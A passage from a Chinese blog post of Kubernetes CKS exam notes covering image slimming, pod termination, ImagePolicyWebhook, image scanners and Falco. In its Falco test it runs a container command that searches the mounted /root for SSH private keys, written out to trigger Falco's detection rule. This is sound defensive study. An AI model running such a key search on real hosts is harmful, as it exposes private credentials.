class=\"line\">https://learnk8s.io/blog/smaller-docker-images</span><br><span class=\"line\">有几个招数：</span><br><span class=\"line\">1. 把RUN的指令合成一条，减少layer数</span><br><span class=\"line\">2. 分步build，前一步可以很大用来build最终文件；然后把最终文件copy到第二个做种的基础镜像。</span><br><span class=\"line\">3. 使用小镜像distroless（这个需要外网才能拉取到）</span><br><span class=\"line\">4. 使用alpine镜像，这个比distroless还小，而且还会携带sh，便于调试；但有个缺点是可能存在兼容性问题，同时安全性方面提供shell也是一个缺点。</span><br><span class=\"line\"></span><br><span class=\"line\">比如几种镜像的大小：</span><br><span class=\"line\">Image\tSize (MB)</span><br><span class=\"line\">node:8\t681</span><br><span class=\"line\">node:8 with multi stage build\t678</span><br><span class=\"line\">gcr.io/distroless/nodejs\t76.7</span><br><span class=\"line\">node:8-alpine\t69.7</span><br></pre></td></tr></table></figure>\n\n\n\n<h2 id=\"pod优雅终止流程\"><a href=\"#pod优雅终止流程\" class=\"headerlink\" title=\"pod优雅终止流程\"></a>pod优雅终止流程</h2><figure class=\"highlight plaintext\"><table><tr><td class=\"code\"><pre><span class=\"line\">https://cloud.google.com/blog/products/containers-kubernetes/kubernetes-best-practices-terminating-with-grace</span><br><span class=\"line\">https://kubernetes.io/docs/concepts/workloads/pods/pod-lifecycle/</span><br><span class=\"line\"></span><br><span class=\"line\">1. 状态设为Terminating</span><br><span class=\"line\">\t这是一个流量挡板，不再接受新的流量，pod也会从svc的endpoints list移除。</span><br><span class=\"line\">2. 发送用户自定义的preStop请求，场景是用户无法控制SIGTERM的回调逻辑。</span><br><span class=\"line\">\t 随后发送SIGTERM给进程，通知退出。所以preStop最好不要阻塞，以免SIGTERM发不出来。</span><br><span class=\"line\">3. 集群等待terminationGracePeriodSeconds直到进程退出或者超时。</span><br><span class=\"line\">\tpreStop和SIGTERM引发的异步退出是并行的，所以等待是同时等待他们两个。</span><br><span class=\"line\">\tterminationGracePeriodSeconds的时间是在发送preStop之前的某个时间就开始了的。</span><br><span class=\"line\">4. 发送SIGKILL给进程，也就是kill -9, 强制结束进程，清除容器。</span><br><span class=\"line\">5. 从apiserver中清理掉pod。</span><br></pre></td></tr></table></figure>\n\n\n\n<h2 id=\"log-place\"><a href=\"#log-place\" class=\"headerlink\" title=\"log place\"></a>log place</h2><p>几个存储日志的地方，特别是有时候apiserver异常，想看apiserver的日志的时候，没法通过kubectl查看。这时候可以直接到那个目录去看日志。</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"code\"><pre><span class=\"line\">https://itnext.io/cks-exam-series-4-crash-that-apiserver-5f4d3d503028</span><br><span class=\"line\"></span><br><span class=\"line\">Log locations to check:</span><br><span class=\"line\">/var/log/pods  # pod的日志, apiserver连不上时可以尝试从这里查看日志</span><br><span class=\"line\">/var/log/containers  # container的日志, 这里的log软连接到pods目录下</span><br><span class=\"line\">docker ps + docker logs</span><br><span class=\"line\">crictl ps + crictl logs (in case when Docker isn’t used)</span><br><span class=\"line\">kubelet logs: /var/log/syslog or journalctl -u kubelet # 这两个好像是一样的</span><br></pre></td></tr></table></figure>\n\n\n\n<h2 id=\"ImagePolicyWebhook\"><a href=\"#ImagePolicyWebhook\" class=\"headerlink\" title=\"ImagePolicyWebhook\"></a>ImagePolicyWebhook</h2><figure class=\"highlight plaintext\"><table><tr><td class=\"code\"><pre><span class=\"line\">资料：</span><br><span class=\"line\">https://github.com/killer-sh/cks-challenge-series/tree/master/challenges/ImagePolicyWebhook</span><br><span class=\"line\">https://kubernetes.io/docs/reference/access-authn-authz/admission-controllers/#imagepolicywebhook</span><br></pre></td></tr></table></figure>\n\n<p>ImagePolicyWebhook也是admission-control中的一个插件，需要通过apiserver的参数–enable-admission-plugins开启，并需要在–admission-control-config-file指定的文件中插入相关配置。</p>\n<p>ImagePolicyWebhook的作用是通过webhook来检查这个image是否被允许。他需要配置几个功能相关的字段，同时需要配置相关的证书文件。</p>\n<p>我们一步一步来完成配置：</p>\n<figure class=\"highlight shell\"><table><tr><td class=\"code\"><pre><span class=\"line\"><span class=\"meta\"></span></span><br><span class=\"line\"><span class=\"meta\">#</span><span class=\"bash\"> 1. 添加ImagePolicyWebhook插件</span></span><br><span class=\"line\"><span class=\"meta\">/etc/kubernetes/admission$</span><span class=\"bash\"> sudo vi admission-control-config-file.yaml</span></span><br><span class=\"line\">...</span><br><span class=\"line\">- name: ImagePolicyWebhook</span><br><span class=\"line\">  path: image-policy.yaml</span><br><span class=\"line\">...</span><br><span class=\"line\"><span class=\"meta\"></span></span><br><span class=\"line\"><span class=\"meta\">#</span><span class=\"bash\"> 2. 添加image-policy.yaml文件</span></span><br><span class=\"line\"><span class=\"meta\">/etc/kubernetes/admission$</span><span class=\"bash\"> sudo vi image-policy.yaml</span></span><br><span class=\"line\">imagePolicy:</span><br><span class=\"line\">  kubeConfigFile: /etc/kubernetes/admission/image-kubeconf.yaml</span><br><span class=\"line\"><span class=\"meta\">  #</span><span class=\"bash\"> time <span class=\"keyword\">in</span> s to cache approval</span></span><br><span class=\"line\">  allowTTL: 50</span><br><span class=\"line\"><span class=\"meta\">  #</span><span class=\"bash\"> time <span class=\"keyword\">in</span> s to cache denial</span></span><br><span class=\"line\">  denyTTL: 50</span><br><span class=\"line\"><span class=\"meta\">  #</span><span class=\"bash\"> time <span class=\"keyword\">in</span> ms to <span class=\"built_in\">wait</span> between retries</span></span><br><span class=\"line\">  retryBackoff: 500</span><br><span class=\"line\"><span class=\"meta\">  #</span><span class=\"bash\"> determines behavior <span class=\"keyword\">if</span> the webhook backend fails</span></span><br><span class=\"line\">  defaultAllow: false</span><br><span class=\"line\"><span class=\"meta\">  </span></span><br><span class=\"line\"><span class=\"meta\">#</span><span class=\"bash\"> 3. 添加image-kubeconf.yaml文件</span></span><br><span class=\"line\"><span class=\"meta\">#</span><span class=\"bash\"> ImagePolicyWebhook是通过kubeconfig格式的文件来配置对外部的访问。</span></span><br><span class=\"line\"><span class=\"meta\">/etc/kubernetes/admission$</span><span class=\"bash\"> sudo vi image-kubeconf.yaml</span></span><br><span class=\"line\">apiVersion: v1</span><br><span class=\"line\">kind: Config</span><br><span class=\"line\"></span><br><span class=\"line\">clusters:</span><br><span class=\"line\">- cluster:</span><br><span class=\"line\">    certificate-authority: /etc/kubernetes/admission/imagecert/external-cert.pem</span><br><span class=\"line\">    server: https://external-service:1234/check-image</span><br><span class=\"line\">  name: image-checker</span><br><span class=\"line\"></span><br><span class=\"line\">contexts:</span><br><span class=\"line\">- context:</span><br><span class=\"line\">    cluster: image-checker</span><br><span class=\"line\">    user: api-server</span><br><span class=\"line\">  name: image-checker</span><br><span class=\"line\">current-context: image-checker</span><br><span class=\"line\">preferences: &#123;&#125;</span><br><span class=\"line\"></span><br><span class=\"line\">users:</span><br><span class=\"line\">- name: api-server</span><br><span class=\"line\">  user:</span><br><span class=\"line\">    client-certificate: /etc/kubernetes/admission/imagecert/apiserver-client-cert.pem     # cert for the webhook admission controller to use</span><br><span class=\"line\">    client-key:  /etc/kubernetes/admission/imagecert/apiserver-client-key.pem</span><br><span class=\"line\">    </span><br><span class=\"line\">这里我们设置一个不存在的server地址，因为没有这样的server用来测试。</span><br><span class=\"line\">然后指定了client-certificate和client-key作为客户端的证书，指定certificate-authority作为外部服务的CA证书。</span><br><span class=\"line\"><span class=\"meta\"></span></span><br><span class=\"line\"><span class=\"meta\">#</span><span class=\"bash\"> 4. 创建证书文件。</span></span><br><span class=\"line\"><span class=\"meta\">/etc/kubernetes/admission$</span><span class=\"bash\"> sudo mkdir imagecert</span></span><br><span class=\"line\"><span class=\"meta\">/etc/kubernetes/admission$</span><span class=\"bash\"> <span class=\"built_in\">cd</span> imagecert/</span></span><br><span class=\"line\"><span class=\"meta\">#</span><span class=\"bash\"> 我们借助现成的一套证书来做测试</span></span><br><span class=\"line\"><span class=\"meta\">/etc/kubernetes/admission/imagecert$</span><span class=\"bash\"> sudo wget https://github.com/killer-sh/cks-challenge-series/archive/refs/heads/master.zip -O /tmp/resource.zip</span></span><br><span class=\"line\"><span class=\"meta\">#</span><span class=\"bash\"> ......</span></span><br><span class=\"line\"><span class=\"meta\">/etc/kubernetes/admission/imagecert$</span><span class=\"bash\"> unzip /tmp/resource.zip -d /tmp</span></span><br><span class=\"line\"><span class=\"meta\">#</span><span class=\"bash\"> ......</span></span><br><span class=\"line\"><span class=\"meta\">/etc/kubernetes/admission/imagecert$</span><span class=\"bash\"> sudo cp /tmp/cks-challenge-series-master/challenges/ImagePolicyWebhook/*.pem ./</span></span><br><span class=\"line\"><span class=\"meta\">/etc/kubernetes/admission/imagecert$</span><span class=\"bash\"> ls</span></span><br><span class=\"line\">apiserver-client-cert.pem  apiserver-client-key.pem  external-cert.pem  external-key.pem</span><br><span class=\"line\"><span class=\"meta\">/etc/kubernetes/admission/imagecert$</span><span class=\"bash\"> ls ..</span></span><br><span class=\"line\">admission-control-config-file.yaml  image-kubeconf.yaml  imagecert</span><br><span class=\"line\">eventconfig.yaml                    image-policy.yaml</span><br><span class=\"line\"><span class=\"meta\">#</span><span class=\"bash\"> eventconfig.yaml是另一个插件配置了EventRateLimit</span></span><br><span class=\"line\"><span class=\"meta\"></span></span><br><span class=\"line\"><span class=\"meta\">#</span><span class=\"bash\"> 5. 开启ImagePolicyWebhook开关</span></span><br><span class=\"line\"><span class=\"meta\">/etc/kubernetes/admission/imagecert$</span><span class=\"bash\"> sudo vi ../../manifests/kube-apiserver.yaml</span></span><br><span class=\"line\">...</span><br><span class=\"line\">  - --enable-admission-plugins=NodeRestriction,PodSecurityPolicy,EventRateLimit,ImagePolicyWebhook</span><br><span class=\"line\">...</span><br></pre></td></tr></table></figure>\n\n<p>等待apiserver重启完成，我们来测试创建pod，由于外部服务不可达，所以我们的pod会一直无法创建成功。</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"code\"><pre><span class=\"line\">~$ kl run ng1 --image nginx</span><br><span class=\"line\">Error from server (Forbidden): pods &quot;ng1&quot; is forbidden: Post &quot;https://external-service:1234/check-image?timeout=30s&quot;: dial tcp: lookup external-service on 192.168.3.1:53: no such host</span><br></pre></td></tr></table></figure>\n\n\n\n<p>随后我们编辑image-policy.yaml，把其中defaultAllow设成true。</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"code\"><pre><span class=\"line\">/etc/kubernetes/admission$ sudo vi image-policy.yaml</span><br><span class=\"line\">imagePolicy:</span><br><span class=\"line\">  kubeConfigFile: /etc/kubernetes/admission/image-kubeconf.yaml</span><br><span class=\"line\">  # time in s to cache approval</span><br><span class=\"line\">  allowTTL: 50</span><br><span class=\"line\">  # time in s to cache denial</span><br><span class=\"line\">  denyTTL: 50</span><br><span class=\"line\">  # time in ms to wait between retries</span><br><span class=\"line\">  retryBackoff: 500</span><br><span class=\"line\">  # determines behavior if the webhook backend fails</span><br><span class=\"line\">  defaultAllow: true</span><br></pre></td></tr></table></figure>\n\n<p>然后重启apiserver。我们再次执行创建pod，发现可以创建成功了。</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"code\"><pre><span class=\"line\">~$ kl run ng1 --image nginx</span><br><span class=\"line\">pod/ng1 created</span><br></pre></td></tr></table></figure>\n\n<h2 id=\"immutable-pod-stateless-pod\"><a href=\"#immutable-pod-stateless-pod\" class=\"headerlink\" title=\"immutable pod / stateless pod\"></a>immutable pod / stateless pod</h2><figure class=\"highlight plaintext\"><table><tr><td class=\"code\"><pre><span class=\"line\">immutable主要是指pod不能修改主机文件</span><br><span class=\"line\">security context中的readOnlyRootFilesystem以及privileged都得是false。</span><br><span class=\"line\"></span><br><span class=\"line\">stateles主要是不能存数据在container中，emptyDir的volume也不行。</span><br></pre></td></tr></table></figure>\n\n\n\n<h2 id=\"kubesec\"><a href=\"#kubesec\" class=\"headerlink\" title=\"kubesec\"></a>kubesec</h2><p>kubesec是一个静态扫描的工具，扫描一个yaml文件存在的安全隐患。</p>\n<figure class=\"highlight shell\"><table><tr><td class=\"code\"><pre><span class=\"line\">文档：</span><br><span class=\"line\">https://github.com/controlplaneio/kubesec</span><br><span class=\"line\"><span class=\"meta\"></span></span><br><span class=\"line\"><span class=\"meta\">#</span><span class=\"bash\">install</span></span><br><span class=\"line\">go install github.com/controlplaneio/kubesec/v2@latest</span><br><span class=\"line\"><span class=\"meta\">#</span><span class=\"bash\"> <span class=\"keyword\">then</span></span></span><br><span class=\"line\">kl run ngsec --image nginx --restart=Never --dry-run=client -oyaml &gt; ngsec.yaml</span><br><span class=\"line\">kubesec scan ngsec.yaml</span><br><span class=\"line\"><span class=\"meta\"></span></span><br><span class=\"line\"><span class=\"meta\">#</span><span class=\"bash\"> 我们也可以使用他的免安装版：</span></span><br><span class=\"line\"><span class=\"meta\">~$</span><span class=\"bash\"> kl run ngsec --image nginx --restart=Never --dry-run=client -oyaml &gt; ngsec.yaml</span></span><br><span class=\"line\"><span class=\"meta\">~$</span><span class=\"bash\"> curl -sSX POST --data-binary @<span class=\"string\">&quot;ngsec.yaml&quot;</span> https://v2.kubesec.io/scan</span></span><br><span class=\"line\">[</span><br><span class=\"line\">  &#123;</span><br><span class=\"line\">    &quot;object&quot;: &quot;Pod/ngsec.default&quot;,</span><br><span class=\"line\">    &quot;valid&quot;: true,</span><br><span class=\"line\">    &quot;fileName&quot;: &quot;API&quot;,</span><br><span class=\"line\">    &quot;message&quot;: &quot;Passed with a score of 0 points&quot;,</span><br><span class=\"line\">    &quot;score&quot;: 0,</span><br><span class=\"line\">    &quot;scoring&quot;: &#123;</span><br><span class=\"line\">      &quot;advise&quot;: [</span><br><span class=\"line\">        &#123;</span><br><span class=\"line\">          &quot;id&quot;: &quot;ApparmorAny&quot;,</span><br><span class=\"line\">          &quot;selector&quot;: &quot;.metadata .annotations .\\&quot;container.apparmor.security.beta.kubernetes.io/nginx\\&quot;&quot;,</span><br><span class=\"line\">          &quot;reason&quot;: &quot;Well defined AppArmor policies may provide greater protection from unknown threats. WARNING: NOT PRODUCTION READY&quot;,</span><br><span class=\"line\">          &quot;points&quot;: 3</span><br><span class=\"line\">        &#125;,</span><br><span class=\"line\">        ......</span><br><span class=\"line\">      ]</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">  &#125;</span><br><span class=\"line\">]</span><br></pre></td></tr></table></figure>\n\n\n\n<h2 id=\"trivy\"><a href=\"#trivy\" class=\"headerlink\" title=\"trivy\"></a>trivy</h2><p>静态扫描镜像的安全风险。</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"code\"><pre><span class=\"line\"># install</span><br><span class=\"line\">https://aquasecurity.github.io/trivy/v0.22.0/getting-started/installation/</span><br><span class=\"line\"># 注意，trivy不存在我所使用的树莓派的系统的源，所以用apt的方式拉不到</span><br><span class=\"line\"># 尝试用源码编译，却遇到网络问题，所以我放弃在树莓派上的安装。改在自己的pc上安装，因为这个就是一个静态扫描的，并不依赖集群，所以随便装到一个能装上的机器就可以了。</span><br><span class=\"line\"></span><br><span class=\"line\"># 使用方法：</span><br><span class=\"line\"># https://github.com/aquasecurity/trivy</span><br><span class=\"line\"># 比如扫描镜像yizhiren/opa:0.35.0-rootless</span><br><span class=\"line\">% trivy image yizhiren/opa:0.35.0-rootless</span><br><span class=\"line\">2022-01-08T12:38:44.803+0800\tINFO\tDetected OS: ubuntu</span><br><span class=\"line\">2022-01-08T12:38:44.805+0800\tINFO\tDetecting Ubuntu vulnerabilities...</span><br><span class=\"line\">2022-01-08T12:38:44.812+0800\tINFO\tNumber of language-specific files: 1</span><br><span class=\"line\">2022-01-08T12:38:44.812+0800\tINFO\tDetecting gobinary vulnerabilities...</span><br><span class=\"line\"></span><br><span class=\"line\">yizhiren/opa:0.35.0-rootless (ubuntu 21.10)</span><br><span class=\"line\">===========================================</span><br><span class=\"line\">Total: 21 (UNKNOWN: 0, LOW: 18, MEDIUM: 3, HIGH: 0, CRITICAL: 0)</span><br><span class=\"line\"></span><br><span class=\"line\">+------------------+------------------+----------+-----------------------+---------------+-----------------------------------------+</span><br><span class=\"line\">|     LIBRARY      | VULNERABILITY ID | SEVERITY |   INSTALLED VERSION   | FIXED VERSION |                  TITLE                  |</span><br><span class=\"line\">+------------------+------------------+----------+-----------------------+---------------+-----------------------------------------+</span><br><span class=\"line\">| coreutils        | CVE-2016-2781    | LOW      | 8.32-4ubuntu2         |               | coreutils: Non-privileged               |</span><br><span class=\"line\">|                  |                  |          |                       |               | session can escape to the               |</span><br><span class=\"line\">|                  |                  |          |                       |               | parent session in chroot                |</span><br><span class=\"line\">|                  |                  |          |                       |               | --&gt;avd.aquasec.com/nvd/cve-2016-2781    |</span><br><span class=\"line\">+------------------+------------------+----------+-----------------------+---------------+-----------------------------------------+</span><br><span class=\"line\">| libc-bin         | CVE-2021-38604   | MEDIUM   | 2.34-0ubuntu3         |               | glibc: NULL pointer dereference in      |</span><br><span class=\"line\">|                  |                  |          |                       |               | helper_thread() in mq_notify.c while    |</span><br><span class=\"line\">|                  |                  |          |                       |               | handling NOTIFY_REMOVED messages...     |</span><br><span class=\"line\">|                  |                  |          |                       |               | --&gt;avd.aquasec.com/nvd/cve-2021-38604   |</span><br><span class=\"line\">+                  +------------------+----------+                       +---------------+-----------------------------------------+</span><br><span class=\"line\">|                  | CVE-2016-10228   | LOW      |                       |               | glibc: iconv program can hang           |</span><br><span class=\"line\">|                  |                  |          |                       |               | when invoked with the -c option         |</span><br><span class=\"line\">|                  |                  |          |                       |               | --&gt;avd.aquasec.com/nvd/cve-2016-10228   |</span><br><span class=\"line\">+                  +------------------+          +                       +---------------+-----------------------------------------+</span><br><span class=\"line\">......</span><br><span class=\"line\"></span><br><span class=\"line\">可以看到列出了安全风险以及风险级别。</span><br><span class=\"line\"></span><br><span class=\"line\"></span><br><span class=\"line\">trivy还支持fs和config子命令，考试只会考到trivy image，但是其他两个子命令也有实用价值。</span><br><span class=\"line\">fs会扫描目录下的所有文件，检查其中的引入的风险点，包括镜像名，库名，某个字段。</span><br><span class=\"line\">config则只会扫描目录下文件中的字段。</span><br><span class=\"line\">github主页中都有列举：https://github.com/aquasecurity/trivy#quick-start</span><br></pre></td></tr></table></figure>\n\n\n\n\n\n<h2 id=\"anchore-syft\"><a href=\"#anchore-syft\" class=\"headerlink\" title=\"anchore/syft\"></a>anchore/syft</h2><p>syft也是静态扫描工具，可以列出image中的软件清单</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"code\"><pre><span class=\"line\">https://github.com/anchore/syft </span><br><span class=\"line\"></span><br><span class=\"line\"># install</span><br><span class=\"line\">curl -sSfL https://raw.githubusercontent.com/anchore/syft/main/install.sh | sh -s -- -b /usr/local/bin</span><br><span class=\"line\">如果网络问题，可以先把install.sh内容去保存下来，然后cat install.sh | sh -s -- -b /usr/local/bin latest</span><br><span class=\"line\">如果还是有网络问题，立即换到网络通畅的机器上，这个反正是静态工具，不依赖集群的。</span><br><span class=\"line\"></span><br><span class=\"line\"># usage</span><br><span class=\"line\">% syft yizhiren/opa:0.35.0-rootless</span><br><span class=\"line\"></span><br><span class=\"line\"> ✔ Pulled image            </span><br><span class=\"line\"> ✔ Loaded image            </span><br><span class=\"line\"> ✔ Parsed image            </span><br><span class=\"line\"> ✔ Cataloged packages      [101 packages]</span><br><span class=\"line\">NAME                 VERSION                             TYPE </span><br><span class=\"line\">adduser              3.118ubuntu5                        deb   </span><br><span class=\"line\">apt                  2.3.9                               deb   </span><br><span class=\"line\">base-files           11.1ubuntu5                         deb   </span><br><span class=\"line\">base-passwd          3.5.51                              deb   </span><br><span class=\"line\">bash                 5.1-3ubuntu2                        deb   </span><br><span class=\"line\">bsdutils             1:2.36.1-8ubuntu2                   deb   </span><br><span class=\"line\">coreutils            8.32-4ubuntu2                       deb   </span><br><span class=\"line\">dash                 0.5.11+git20210120+802ebd4-1build1  deb   </span><br><span class=\"line\">debconf              1.5.77                              deb</span><br><span class=\"line\">......</span><br></pre></td></tr></table></figure>\n\n\n\n<h2 id=\"anchore-grype\"><a href=\"#anchore-grype\" class=\"headerlink\" title=\"anchore/grype\"></a>anchore/grype</h2><p>grype也是安全检查用的，跟trivy是一样的作用。grype内部依赖syft的列清单功能。</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"code\"><pre><span class=\"line\">https://github.com/anchore/grype</span><br><span class=\"line\"></span><br><span class=\"line\"># install</span><br><span class=\"line\">curl -sSfL https://raw.githubusercontent.com/anchore/grype/main/install.sh | sh -s -- -b /usr/local/bin</span><br><span class=\"line\">如果网络问题，可以先把install.sh内容去保存下来，然后cat install.sh | sh -s -- -b /usr/local/bin latest</span><br><span class=\"line\">如果还是有网络问题，立即换到网络通畅的机器上，这个反正是静态工具，不依赖集群的。</span><br><span class=\"line\"></span><br><span class=\"line\"># usage:</span><br><span class=\"line\">% grype yizhiren/opa:0.35.0-rootless</span><br><span class=\"line\"></span><br><span class=\"line\"> ✔ Vulnerability DB        [updated]</span><br><span class=\"line\"> ✔ Loaded image            </span><br><span class=\"line\"> ✔ Parsed image            </span><br><span class=\"line\"> ✔ Cataloged packages      [101 packages]</span><br><span class=\"line\"> ✔ Scanned image           [21 vulnerabilities]</span><br><span class=\"line\"></span><br><span class=\"line\">NAME              INSTALLED              FIXED-IN  VULNERABILITY     SEVERITY   </span><br><span class=\"line\">coreutils         8.32-4ubuntu2                    CVE-2016-2781     Low         </span><br><span class=\"line\">libc-bin          2.34-0ubuntu3                    CVE-2016-10228    Negligible  </span><br><span class=\"line\">libc-bin          2.34-0ubuntu3                    CVE-2021-38604    Medium      </span><br><span class=\"line\">libc-bin          2.34-0ubuntu3                    CVE-2020-29562    Low         </span><br><span class=\"line\">libc-bin          2.34-0ubuntu3                    CVE-2019-25013    Low         </span><br><span class=\"line\">libc6             2.34-0ubuntu3                    CVE-2016-10228    Negligible  </span><br><span class=\"line\">libc6             2.34-0ubuntu3                    CVE-2021-38604    Medium</span><br><span class=\"line\">......</span><br></pre></td></tr></table></figure>\n\n\n\n<h2 id=\"sysdig-falco\"><a href=\"#sysdig-falco\" class=\"headerlink\" title=\"sysdig/falco\"></a>sysdig/falco</h2><p>falco会安装内核驱动，然后收集系统的所有行为，然后在上层通过规则来过滤关注的事件并记录日志，是个很强悍的工具。</p>\n<p><img src=\"/linkimage/cksknowledge/falco_architecture.png\" alt=\"rbac角色\"></p>\n<p>图片来自<a href=\"https://falco.org/docs/getting-started/\">Getting Started</a></p>\n<p>安装falco有两种途径，一种是物理机直接安装，一种是通过docker安装，不过遗憾的是这个工具不支持arm。所以树莓派上跑不起来，还是得在外部机器安装一下，这个工具考试是必考的，大家一定要找个集群安装上尝试一下。</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"code\"><pre><span class=\"line\">N: Skipping acquire of configured file &#x27;main/binary-arm64/Packages&#x27; as repository &#x27;https://download.falco.org/packages/deb stable InRelease&#x27; doesn&#x27;t support architecture &#x27;arm64&#x27;</span><br></pre></td></tr></table></figure>\n\n<p>下面的步骤基于amd64的机器。</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"code\"><pre><span class=\"line\"># 安装falco</span><br><span class=\"line\"># 直接root用户下操作的，所以省略sudo命令，若非root请加上sudo</span><br><span class=\"line\"></span><br><span class=\"line\"># https://falco.org/docs/getting-started/installation/</span><br><span class=\"line\"># https://falco.org/docs/getting-started/running/</span><br><span class=\"line\"></span><br><span class=\"line\"># 直接安装</span><br><span class=\"line\">curl -s https://falco.org/repo/falcosecurity-3672BA8F.asc | apt-key add -</span><br><span class=\"line\">echo &quot;deb https://download.falco.org/packages/deb stable main&quot; \\ | tee -a /etc/apt/sources.list.d/falcosecurity.list</span><br><span class=\"line\"></span><br><span class=\"line\"></span><br><span class=\"line\">apt install linux-headers-$(uname -r)</span><br><span class=\"line\"></span><br><span class=\"line\">apt-get update &amp;&amp; sudo apt-get install falco -y</span><br><span class=\"line\"></span><br><span class=\"line\">systemctl start falco</span><br><span class=\"line\">systemctl status falco</span><br><span class=\"line\"></span><br><span class=\"line\"># insert kernel module</span><br><span class=\"line\">falco-driver-loader</span><br><span class=\"line\"></span><br><span class=\"line\"># check working</span><br><span class=\"line\">curl localhost:8765/healthz; echo</span><br><span class=\"line\"></span><br><span class=\"line\"></span><br><span class=\"line\"></span><br><span class=\"line\"># 通过docker安装</span><br><span class=\"line\"># load driver</span><br><span class=\"line\">docker pull falcosecurity/falco-driver-loader:latest</span><br><span class=\"line\">docker run --rm -i -t \\</span><br><span class=\"line\">    --privileged \\</span><br><span class=\"line\">    -v /root/.falco:/root/.falco \\</span><br><span class=\"line\">    -v /proc:/host/proc:ro \\</span><br><span class=\"line\">    -v /boot:/host/boot:ro \\</span><br><span class=\"line\">    -v /lib/modules:/host/lib/modules:ro \\</span><br><span class=\"line\">    -v /usr:/host/usr:ro \\</span><br><span class=\"line\">    -v /etc:/host/etc:ro \\</span><br><span class=\"line\">    falcosecurity/falco-driver-loader:latest &amp;&amp; echo &quot;Falco drivers installed!&quot;</span><br><span class=\"line\"></span><br><span class=\"line\"># run falco</span><br><span class=\"line\">docker pull falcosecurity/falco-no-driver:latest</span><br><span class=\"line\">docker run --rm -d \\</span><br><span class=\"line\">  --name &quot;falco_training&quot; \\</span><br><span class=\"line\">  --security-opt apparmor:unconfined \\</span><br><span class=\"line\">  -p 8765:8765 \\</span><br><span class=\"line\">  -e HOST_ROOT=/ \\</span><br><span class=\"line\">  --cap-add SYS_PTRACE \\</span><br><span class=\"line\">  --pid=host $(ls /dev/falco* | xargs -I &#123;&#125; echo --device &#123;&#125;) \\</span><br><span class=\"line\">  -v /var/run/docker.sock:/var/run/docker.sock \\</span><br><span class=\"line\">  falcosecurity/falco-no-driver:latest</span><br><span class=\"line\"></span><br><span class=\"line\"></span><br></pre></td></tr></table></figure>\n\n<p>测试功能：</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"code\"><pre><span class=\"line\">默认的falco就会关注一些事件并做记录，我们就来测试这些事件。</span><br><span class=\"line\"></span><br><span class=\"line\"># 1. 运行敏感操作，这是一个敏感操作，需要被关注。</span><br><span class=\"line\">root@ubsvr1:~# docker run -v /root:/root busybox sh -c &quot;find /root -name id_rsa&quot;</span><br><span class=\"line\">/root/.ssh/id_rsa</span><br><span class=\"line\">注意这里挂载root目录是模拟真实的危险场景，不挂载也不影响本次测试。</span><br><span class=\"line\"></span><br><span class=\"line\"># 2. 然后查看falco的日志，看看有没有捕捉到。</span><br><span class=\"line\"># https://falco.org/docs/getting-started/running/</span><br><span class=\"line\"># 日志获取有两种情况，针对直接安装和docker安装分别如此查看日志：</span><br><span class=\"line\">host安装的话：</span><br><span class=\"line\">journalctl -u falco</span><br><span class=\"line\">docker安装的话：</span><br><span class=\"line\">docker logs container-name</span><br><span class=\"line\"></span><br><span class=\"line\">root@ubsvr1:~# docker logs falco_training 2&gt;&amp;1 | grep &quot;find /root -name id_rsa&quot;</span><br><span class=\"line\"># 或者 journalctl -u falco | grep &quot;find /root -name id_rsa&quot;</span><br><span class=\"line\">Jan 22 13:40:31 ubsvr1 falco[1746328]: 13:40:31.098801741: Warning Grep private keys or passwords activities found (user=root user_loginuid=-1 command=find /root -name id_rsa container_id=8b66d2dd103b container_name=&lt;NA&gt; image=&lt;NA&gt;:&lt;NA&gt;)</span><br><span class=\"line\"></span><br><span class=\"line\"></span><br><span class=\"line\"># 3. 我们来找一下这个规则是在哪里配置的</span><br><span class=\"line\"># host方式安装的话，配置文件列表在/etc/falco/falco.yaml中配置：</span><br><span class=\"line\">rules_file:</span><br><span class=\"line\">\t- /etc/falco/falco_rules.yaml</span><br><span class=\"line\">\t- /etc/falco/falco_fules.local.yaml</span><br><span class=\"line\">\t- /etc/falco/k8s_audit_rules.yaml</span><br><span class=\"line\">\t- /etc/falco/rules.d</span><br><span class=\"line\">docker方式运行的话，就是容器内的这些文件。</span><br><span class=\"line\"></span><br><span class=\"line\"># 找到了配置</span><br><span class=\"line\">root@ubsvr1:/etc/falco# grep &quot;Grep private keys or passwords activities found&quot; . -r</span><br><span class=\"line\">./falco_rules.yaml:    Grep private keys or passwords activities found</span><br><span class=\"line\">然后通过vi去查看文件，可以查看这条规则的详情：</span><br><span class=\"line\"></span><br></pre></td></tr></table></figure>\n\n<p><img src=\"/linkimage/cksknowledge/falco_rule_match.png\" alt=\"falco_rule_match\"></p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"code\"><pre><span class=\"line\">可以看到一个规则(rule)的基本结构，condition和触发条件，output是输出格式。</span><br></pre></td></tr></table></figure>\n\n<figure class=\"highlight plaintext\"><table><tr><td class=\"code\"><pre><span class=\"line\">output输出到哪里，定义在/etc/falco/falco.yaml中</span><br><span class=\"line\"></span><br><span class=\"line\">在配置文件中alert配置类似如下：</span><br><span class=\"line\">file_output:</span><br><span class=\"line\">  enabled: false</span><br><span class=\"line\">  keep_alive: false</span><br><span class=\"line\">  filename: ./events.txt</span><br><span class=\"line\"></span><br><span class=\"line\">stdout_output:</span><br><span class=\"line\">  enabled: true</span><br><span class=\"line\"></span><br><span class=\"line\">program_output:</span><br><span class=\"line\">  enabled: false</span><br><span class=\"line\">  keep_alive: false</span><br><span class=\"line\">  program: &quot;jq &#x27;&#123;text: .output&#125;&#x27; | curl -d @- -X POST https://hooks.slack.com/services/XXX&quot;</span><br><span class=\"line\"></span><br><span class=\"line\"></span><br></pre></td></tr></table></figure>\n\n<p>最后最主要的falco的规则部分，需要经过简单的学习：</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"code\"><pre><span class=\"line\">参考文档，至少要学会配置一个最基本的rule。</span><br><span class=\"line\">https://falco.org/docs/examples/</span><br><span class=\"line\">https://falco.org/docs/rules/</span><br><span class=\"line\"></span><br><span class=\"line\">再举一个例子参考：</span><br><span class=\"line\"># 